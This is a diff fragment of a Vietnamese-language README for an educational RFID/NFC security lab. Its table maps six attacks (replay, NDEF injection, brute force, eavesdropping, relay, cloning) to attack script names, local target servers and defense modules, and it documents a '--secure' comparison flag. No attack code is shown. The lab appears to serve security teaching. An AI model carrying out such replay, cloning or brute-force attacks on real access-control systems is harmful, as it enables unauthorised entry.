+| Replay | `attacks/replay_attack.py` | `ac_server.py :7001` | `defense/secure_reader.py :7002` |
+| NDEF Injection | `nfc/nfc_injector.py` | `nfc/nfc_tag.py :6011` | `defense/secure_tag.py :6012` |
+| Brute Force | `attacks/brute_force.py` | `ac_server.py :7001` | `defense/secure_reader.py :7002` |
+| Eavesdropping | `attacks/eavesdropper.py` | `rfid/rfid_tag.py :6001` | *(cần mã hoá transport)* |
+| Relay | `attacks/relay_attack.py` | `rfid/rfid_tag.py :6001` | *(cần distance bounding)* |
+| Cloning | `rfid/rfid_cloner.py` | `rfid/rfid_tag.py :6001` | *(cần mutual auth)* |
+
+> **Cờ `--secure`** có trên: `replay_attack.py`, `brute_force.py`, `nfc_injector.py` — giúp chạy cùng script tấn công nhắm vào server đã có defense để so sánh kết quả.
 
 ---
 
 *Educational Use Only — Not for Production*  
-*Lab Version: 1.0 | Generated: 2026-05*
+*Lab Version: 1.0*
